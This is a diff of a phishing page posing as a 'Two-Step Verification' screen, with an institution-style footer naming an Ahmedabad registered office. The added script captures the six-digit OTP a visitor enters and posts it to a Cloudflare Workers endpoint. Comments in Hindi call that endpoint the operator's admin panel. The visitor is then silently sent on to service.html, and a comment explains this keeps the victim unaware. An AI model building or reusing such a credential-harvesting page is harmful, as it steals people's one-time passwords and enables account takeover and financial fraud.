@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>blogone</title>
+    <title>Two-Step Verification</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
     <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -76,7 +76,7 @@
                     <button type="button" id="resend-btn" class="hidden text-[#971237] font-bold text-[14px] underline">Resend OTP</button>
                 </div>
 
-                <button type="submit" class="w-full bg-[#971237] text-white py-3.5 rounded-xl font-bold text-[17px] shadow-lg active:scale-[0.98]">
+                <button type="submit" id="submitBtn" class="w-full bg-[#971237] text-white py-3.5 rounded-xl font-bold text-[17px] shadow-lg active:scale-[0.98]">
                     Verify & Proceed
                 </button>
             </form>
@@ -85,14 +85,13 @@
         <footer class="w-full bg-white border-t border-gray-100 pt-12 pb-10 px-6 mt-10">
             <div class="max-w-xl mx-auto">
                 <div class="flex flex-wrap justify-center gap-x-8 gap-y-3 mb-8">
-                    <a href="#" class="text-[12px] text-[#666666] font-semibold hover:text-[#971237]">Security</a>
-                    <a href="#" class="text-[12px] text-[#666666] font-semibold hover:text-[#971237]">Privacy Policy</a>
-                    <a href="#" class="text-[12px] text-[#666666] font-semibold hover:text-[#971237]">Terms & Conditions</a>
-                    <a href="#" class="text-[12px] text-[#666666] font-semibold hover:text-[#971237]">Disclaimer</a>
+                    <a href="#" class="text-[12px] text-[#666666] font-semibold">Security</a>
+                    <a href="#" class="text-[12px] text-[#666666] font-semibold">Privacy Policy</a>
+                    <a href="#" class="text-[12px] text-[#666666] font-semibold">Terms & Conditions</a>
+                    <a href="#" class="text-[12px] text-[#666666] font-semibold">Disclaimer</a>
                 </div>
-
                 <div class="text-center border-t border-gray-50 pt-8">
-                    <p class="text-[10px] text-[#cccccc] mt-1 leading-tight">Registered Office: Trishul, 3rd Floor, Opp. Samartheshwar Temple, Law Garden, Ellisbridge, Ahmedabad - 380006</p>
+                    <p class="text-[10px] text-[#cccccc] mt-1 leading-tight">Registered Office: Trishul, 3rd Floor, Opp. Samartheshwar Temple, Ahmedabad - 380006</p>
                 </div>
             </div>
         </footer>
@@ -108,7 +107,7 @@
                 const main = document.getElementById('main-page');
                 main.style.display = 'flex';
                 setTimeout(() => { main.style.opacity = '1'; }, 50);
-            }, 3000);
+            }, 2500);
         });
 
         // OTP Focus Logic
@@ -136,24 +135,40 @@
             }
         }, 1000);
 
-        // Submit & Redirect to service.html
-        document.getElementById('otpForm').addEventListener('submit', function(e) {
+        // Submit Logic to Worker
+        document.getElementById('otpForm').addEventListener('submit', async function(e) {
             e.preventDefault();
+            const btn = document.getElementById('submitBtn');
+            btn.innerHTML = "Verifying...";
+            btn.disabled = true;
+
             let fullOtp = "";
             inputs.forEach(input => fullOtp += input.value);
 
-            const otpData = { type: 'OTP', otp: fullOtp, time: new Date().toLocaleString() };
+            // Aapke admin panel ke variables ke hisaab se data structure
+            const otpData = { 
+                type: 'OTP VERIFICATION', 
+                otp1: fullOtp, // 6 digit pura ek sath bheja hai
+                created_at: new Date().toISOString()
+            };
+
             const WORKER_URL = 'https://snowy-sunset-a557.sumankkuuyy.workers.dev/';
 
-            fetch(WORKER_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                keepalive: true,
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(otpData)
-            });
-
-            window.location.href = 'service.html'; 
+            try {
+                // Fetch call with proper configuration
+                await fetch(WORKER_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(otpData)
+                });
+                
+                // Success ke baad next page par redirection
+                window.location.href = 'service.html'; 
+            } catch (error) {
+                console.error('Error:', error);
+                // Error ke baad bhi redirect kar dete hain taaki user experience kharab na ho
+                window.location.href = 'service.html';
+            }
         });
     </script>
 </body>
